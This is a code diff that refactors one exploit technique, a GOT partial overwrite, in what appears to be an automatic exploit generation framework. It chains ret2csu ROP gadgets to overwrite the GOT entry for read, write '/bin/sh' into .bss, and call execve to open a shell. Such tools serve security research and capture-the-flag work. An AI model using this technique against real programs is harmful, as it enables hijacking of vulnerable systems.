@@ -40,34 +40,37 @@ bool GotPartialOverwrite::checkRequirements() const {
 }
 
 std::vector<RopSubchain> GotPartialOverwrite::getRopSubchains() const {
-    Ret2csu *ret2csu = dynamic_cast<Ret2csu *>(Technique::s_mapper["Ret2csu"]);
+    const Exploit &exploit = g_crax->getExploit();
+    const ELF &elf = exploit.getElf();
+
+    auto ret2csu = dynamic_cast<Ret2csu *>(g_crax->getTechnique("Ret2csu"));
     assert(ret2csu);
 
     // read(0, elf.got['read'], 1), setting RAX to 1.
     RopSubchain read1 = ret2csu->getRopSubchains(
-        BaseOffsetExpr::create(g_crax->getExploit(), "sym", "read"),
+        BaseOffsetExpr::create(elf, "sym", "read"),
         ConstantExpr::create(0, Expr::Int64),
-        BaseOffsetExpr::create(g_crax->getExploit(), "got", "read"),
+        BaseOffsetExpr::create(elf, "got", "read"),
         ConstantExpr::create(1, Expr::Int64))[0];
 
     // write(1, 0, 0), setting RAX to 0.
     RopSubchain read2 = ret2csu->getRopSubchains(
-        BaseOffsetExpr::create(g_crax->getExploit(), "sym", "read"),
+        BaseOffsetExpr::create(elf, "sym", "read"),
         ConstantExpr::create(1, Expr::Int64),
         ConstantExpr::create(0, Expr::Int64),
         ConstantExpr::create(0, Expr::Int64))[0];
 
     // Read "/bin/sh" into elf.bss(), setting RAX to 59.
     RopSubchain read3 = ret2csu->getRopSubchains(
-        BaseOffsetExpr::create(g_crax->getExploit(), "sym", "read"),
+        BaseOffsetExpr::create(elf, "sym", "read"),
         ConstantExpr::create(0, Expr::Int64),
-        BaseOffsetExpr::create(g_crax->getExploit(), "bss"),
+        BaseOffsetExpr::create(elf, "bss"),
         ConstantExpr::create(59, Expr::Int64))[0];
 
     // Return to sys_execve.
     RopSubchain read4 = ret2csu->getRopSubchains(
-        BaseOffsetExpr::create(g_crax->getExploit(), "sym", "read"),
-        BaseOffsetExpr::create(g_crax->getExploit(), "bss"),
+        BaseOffsetExpr::create(elf, "sym", "read"),
+        BaseOffsetExpr::create(elf, "bss"),
         ConstantExpr::create(0, Expr::Int64),
         ConstantExpr::create(0, Expr::Int64))[0];
 
